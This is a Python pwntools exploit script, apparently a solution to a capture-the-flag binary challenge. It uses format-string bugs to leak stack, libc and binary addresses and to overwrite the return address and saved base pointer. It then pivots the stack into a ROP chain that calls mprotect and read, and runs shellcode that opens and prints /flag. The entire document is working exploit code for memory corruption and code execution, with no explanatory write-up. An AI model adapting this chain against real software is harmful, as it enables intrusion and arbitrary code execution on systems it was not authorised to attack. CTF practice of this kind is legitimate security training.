#!/usr/bin/env python3
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
name = "./attachment_patched"
e = context.binary = ELF(name)
if args.REMOTE:
    p = remote("chal.polyuctf.com", 34023)
else:
    p = process(name)
    if args.GDB:
        gdb.attach(p, "b *0x140b\nc")

if args.REMOTE:
    libc = ELF("./libc.so.6")
else:
    libc = e.libc

# Step 1: First format string to leak a stack address
p.send(b"%pAAA")
p.recvuntil(b"0x")
stack_leak = int(p.recvuntil(b"AAA", drop=True), 16)
info(f"Stack leak: {hex(stack_leak)}")

# Step 2: Using the stack leak to redirect execution flow
ra_addr = stack_leak - 27  # Calculate address of return address on stack
payload = "%c%c%p%c"       # Output some chars (17 total with the address)
written = 17

# Calculate how many chars to write for the next %hn
expected = ra_addr & 0xffff  # Get the lower 2 bytes of return address location
payload += f"%{expected - written}c"  # Print enough chars to reach this value
written = expected & 0xff

# Write this value (lower 2 bytes of ra_addr) to the location specified by %41$hn
payload += "%hn"

# Now modify the return target to point to main+0x40 (0x140b -> 0x144b)
# 0x4b - written is the adjustment needed
payload += f"%{(0x4b-written)&0xff}c"
payload += "%41$hhn"  # Write 1 byte at offset 41

p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

# Step 3: Use our control flow to leak libc address
p.recv(4)  # Skip some output
libc_leak = int(p.recv(12), 16)  # Get leaked address
info(f"Libc leak: {hex(libc_leak)}")
libc.address = libc_leak - 0x10e1f2  # Calculate libc base
success(f"Libc base: {hex(libc.address)}")

# Step 4: Leak binary base address
p.send(b"%15$p")
p.recvuntil(b"give you one chance!!!\n0x")
elf_leak = int(p.recv(12), 16)
info(f"ELF leak: {hex(elf_leak)}")
e.address = elf_leak - 0x140b
success(f"Binary base: {hex(e.address)}")

# Step 5: Prepare for stack pivot and ROP chain
# Calculate addresses
rbp_addr = ra_addr + 0x28         # Address where saved RBP is stored
rbp_addr_lsb = rbp_addr & 0xffff  # Lower 2 bytes of that address
rbp_value = e.address + 0x4080    # New stack location (controlled memory)
rbp_value_bytes = p64(rbp_value)  # Pack as 8 bytes
leave_ret_gadget = e.address + 0x1409  # Address of leave;ret gadget
leave_ret_gadget_bytes = p64(leave_ret_gadget)  # Pack as 8 bytes

# Base payload for formatting
payload_base = f"%{0x7e}c%41$hhn"  # Write 0x7e to position 41

# Step 6: Write leave;ret gadget to return address (rbp_addr + 8)
# Write first 2 bytes of leave;ret gadget
written = 0x7e
next_write = (rbp_addr_lsb + 8 - written) & 0xffff
payload = payload_base + f"%{next_write}c"
payload += f"%29$hn"  # Set up where to write
p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

written = 0x7e
next_write = (u16(leave_ret_gadget_bytes[0:2]) - written) & 0xffff
payload = payload_base + f"%{next_write}c"
payload += f"%43$hn"  # Write the value
p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

# Write middle 2 bytes of leave;ret gadget
written = 0x7e
next_write = (rbp_addr_lsb + 8 + 2 - written) & 0xffff
payload = payload_base + f"%{next_write}c"
payload += f"%29$hn"  # Set up where to write
p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

written = 0x7e
next_write = (u16(leave_ret_gadget_bytes[2:4]) - written) & 0xffff
payload = payload_base + f"%{next_write}c"
payload += f"%43$hn"  # Write the value
p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

# Write high 2 bytes of leave;ret gadget
written = 0x7e
next_write = (rbp_addr_lsb + 8 + 4 - written) & 0xffff
payload = payload_base + f"%{next_write}c"
payload += f"%29$hn"  # Set up where to write
p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

written = 0x7e
next_write = (u16(leave_ret_gadget_bytes[4:6]) - written) & 0xffff
payload = payload_base + f"%{next_write}c"
payload += f"%43$hn"  # Write the value
p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

# Step 7: Write new RBP value for stack pivot
# Write first 2 bytes of new RBP
written = 0x7e
next_write = (rbp_addr_lsb - written) & 0xffff
payload = payload_base + f"%{next_write}c"
payload += f"%29$hn"  # Set up where to write
p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

written = 0x7e
next_write = (u16(rbp_value_bytes[0:2]) - written) & 0xffff
payload = payload_base + f"%{next_write}c"
payload += f"%43$hn"  # Write the value
p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

# Write middle 2 bytes of new RBP
written = 0x7e
next_write = (rbp_addr_lsb + 2 - written) & 0xffff
payload = payload_base + f"%{next_write}c"
payload += f"%29$hn"  # Set up where to write
p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

written = 0x7e
next_write = (u16(rbp_value_bytes[2:4]) - written) & 0xffff
payload = payload_base + f"%{next_write}c"
payload += f"%43$hn"  # Write the value
p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

# Write high 2 bytes of new RBP
written = 0x7e
next_write = (rbp_addr_lsb + 4 - written) & 0xffff
payload = payload_base + f"%{next_write}c"
payload += f"%29$hn"  # Set up where to write
p.recvuntil(b"begin your challenge\n")
p.send(payload.encode())

# Final payload: write last 2 bytes of RBP and trigger the stack pivot
written = 0x9  # Using 0x9 for the last payload (special value)
next_write = (u16(rbp_value_bytes[4:6]) - written) & 0xffff
payload = f"%{0x9}c%41$hhn" + f"%{next_write}c"
payload += f"%43$hn"

# Add ROP chain and stage 2 payload
rop = ROP(libc)
rop.call(libc.sym["mprotect"], [e.address + 0x4000, 0x1000, 7])  # Make memory executable
rop.call(libc.sym["read"], [0, e.address + 0x4000, 0x1000])      # Read shellcode
rop.call(e.address + 0x4000)                                    # Jump to shellcode

# Create payload that will be placed at our new stack location
payload = payload.ljust(0x20, "\0").encode()
payload += flat([
    e.address + 0x4800,  # New RBP value at 0x4080
    rop.chain(),         # Our ROP chain
])

p.recvuntil(b"begin your challenge\n")
p.send(payload)

# Step 8: Send shellcode to read the flag
flag_path = b"/flag".ljust(32, b"\0")

shellcode = f"""
push 0x0
push 0x0
push 0x0
push 0x0
mov rax, {unpack(flag_path[24:32].ljust(8, bytes([0])), "all")}
push rax
mov rax, {unpack(flag_path[16:24].ljust(8, bytes([0])), "all")}
push rax
mov rax, {unpack(flag_path[8:16].ljust(8, bytes([0])), "all")}
push rax
mov rax, {unpack(flag_path[0:8].ljust(8, bytes([0])), "all")}
push rax

mov rax, 437    # SYS_openat2
mov rdi, -100   # AT_FDCWD
mov rsi, rsp    # pointer to pathname
lea rdx, [rsp + 32]  # pointer to openat2 structure
mov r10, 0x18   # size of openat2 structure
syscall

mov rax, 0      # SYS_read
mov rdi, 3      # fd returned from openat2
mov rsi, rsp    # buffer to read into
mov rdx, 0x100  # number of bytes to read
syscall

mov rax, 1      # SYS_write
mov rdi, 1      # stdout
mov rsi, rsp    # buffer to write from
mov rdx, 0x100  # number of bytes to write
syscall

int3            # breakpoint
"""

p.send(asm(shellcode))

# Receive and print the flag
flag = p.recv(0x100)
print(flag)

p.interactive()
